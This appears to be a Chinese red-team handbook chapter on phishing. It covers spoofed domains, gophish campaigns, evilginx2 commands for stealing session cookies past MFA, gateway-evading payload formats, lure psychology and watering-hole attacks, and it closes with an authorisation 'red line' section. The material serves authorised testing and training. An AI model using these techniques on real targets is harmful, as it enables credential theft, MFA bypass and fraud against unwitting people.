# 钓鱼与社会工程

## 1. 知识点讲解

钓鱼的本质是「借用信任链」：信任的来源可以是域名（仿冒）、发件人（伪造/被盗账号）、上下文（内部话术）。成熟度分三级：批量撒网（凭据收割）→ 鱼叉（定向个体）→ 鲸钓/商业邮件欺诈（BEC）。红队视角的目标是拿到「有效凭据或终端执行」，不是发出去多少封。

## 2. 基础设施搭建

| 组件 | 要点 |
| --- | --- |
| 域名 | 仿冒三法：同形异字（rn→m、0→o）、加词（xxx-mail.com）、换 TLD；提前养域名年龄与分类 |
| 邮件信誉 | SPF/DKIM/DMARC 三件套必须配全；新域名先预热（小量正常邮件） |
| 投递通道 | 自建 postfix / 商业 ESMTP / 被盗邮箱（最像真的） |
| 目标侧检测 | 先探测目标网关：发测试邮件看 banner、隔离策略、链接重写（Proofpoint/Mimecast 会重写 URL） |

## 3. 工具链

```bash
# gophish：群发与数据回收平台
# 流程：Sending Profiles(SMTP) → Landing Page(克隆登录页) → Email Template → Users&Groups → Campaign
# 要点：模板里 {{.URL}} 带跟踪参数；开启打开/点击/提交三事件

# evilginx2：AiTM（中间人钓鱼），可绕 MFA
evilginx2 -p /etc/evilginx2
config domain phish.example.com
config ip <vps_ip>
phishlets hostname o365 phish.example.com
lures create o365 → 生成钓鱼链接
sessions → 收割 cookie/token（直接导入浏览器即可登录）
```

AiTM 核心原理：反向代理真实登录页，转发用户与真实站点间的全部流量，窃取最终会话 cookie——MFA 也拦不住「登录完成后的会话」。

## 4. 载荷形态（终端执行向）

| 载荷 | 说明 | 适用 |
| --- | --- | --- |
| Office 宏 | 经典，但默认禁用；用「启用内容查看」话术 | 老环境、内网办公 |
| LNK 快捷方式 | 双击执行 powershell/curl 拉二阶段 | 压缩包投递绕网关 |
| ISO/IMG 容器 | 绕 MOTW（网络来源标记），双击自动挂载 | 主流替代 zip 的方案 |
| HTML Smuggling | JS 在浏览器端拼装释放文件，网关看不到明文载荷 | 绕邮件沙箱 |
| OneNote/WSF/JS | 冷门格式过网关白名单 | 见招拆招 |
| 云盘外链 | 链接指向 OneDrive/Docs 再跳转，信誉高 | 链接重写对抗 |

免杀配合见 06 分册；载荷投递前必在本地同类环境实测杀软反应。

## 5. 话术设计要点

- 上下文来源：01-01/01-03 的情报（组织架构、近期事件、供应商关系、内部系统名）。
- 三钩子：紧急（限时）、权威（领导/IT/法务）、惯性（工资条/放假通知/系统升级）。
- 一封邮件只要一个动作；落地页与目标真实 SSO 页像素级对齐。
- 时间选择：工作日上午 9-10 点、节假日前夕打开率最高。

## 6. 水坑与近源

- 水坑：控制目标员工常访问的行业站点/供应商页面，挂定向脚本（按 IP 段触发）。
- 近源（授权内）：恶意 USB、Wi-Fi 钓鱼门户（captive portal 收域账号）。

## 7. 红线

钓鱼是授权敏感区：目标人员名单、是否允许真实凭据收集、演练窗口必须书面确认；收割的凭据只用一次验证有效性，不翻邮件、不冒充发信。
